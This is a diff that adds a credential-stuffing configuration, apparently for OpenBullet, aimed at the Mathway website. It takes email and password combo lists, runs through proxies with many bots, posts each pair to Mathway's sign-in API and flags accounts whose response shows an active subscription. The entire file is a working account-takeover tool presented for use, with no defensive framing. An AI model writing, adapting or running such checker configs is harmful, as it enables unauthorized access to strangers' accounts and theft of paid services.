@@ -1,0 +1,51 @@
+[SETTINGS]
+{
+  "Name": "Mathway",
+  "SuggestedBots": 50,
+  "LastModified": "2018-07-09T16:41:50.2461528+00:00",
+  "AdditionalInfo": "",
+  "Author": "Pythong",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#GET_LOGIN_PAGE REQUEST GET "https://www.mathway.com/Algebra" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  COOKIE "set-cookie:: Mathway.LastSubject=Algebra;" 
+  COOKIE "cookie:: Mathway.IncomingCulture=en-US; Mathway.Culture=en-US; session-set=true; Mathway.AnonUserId=176714942; G_ENABLED_IDPS=google; Mathway.LastSubject=Algebra; ASP.NET_SessionId=ogatr3eib3ahehwohki4fyjx; gsScrollPos-25=" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER ":authority:: www.mathway.com" 
+  HEADER "upgrade-insecure-requests:: 1" 
+#POST_LOGIN REQUEST POST "https://www.mathway.com/localapiuser/rest/signIn/" AutoRedirect=TRUE 
+  CONTENT "{\"device\":\"web;large;landscape;1\",\"email\":\"<USER>\",\"password\":\"<PASS>\",\"anonUserId\":\"110817047\",\"promoCode\":false}" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "referer: https://www.mathway.com/rest/signIn/" 
+  HEADER "origin: https://www.mathway.com" 
+#CAPTURE_SUBSCRIBTION PARSE "<SOURCE>" REGEX "isSubscribed\":([\"true\"]*)" "[0]" Recursive=FALSE -> CAP "SUBSCRIBTION" "" "" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success AND 
+    KEY "status\":1,\"message\":\"\"" 
+    KEY "isSubscribed\":true" 
+  KEYCHAIN Failure AND 
+    KEY "status\":-1,\"message\":\"\"" 
+    KEY "isSubscribed\":false" 
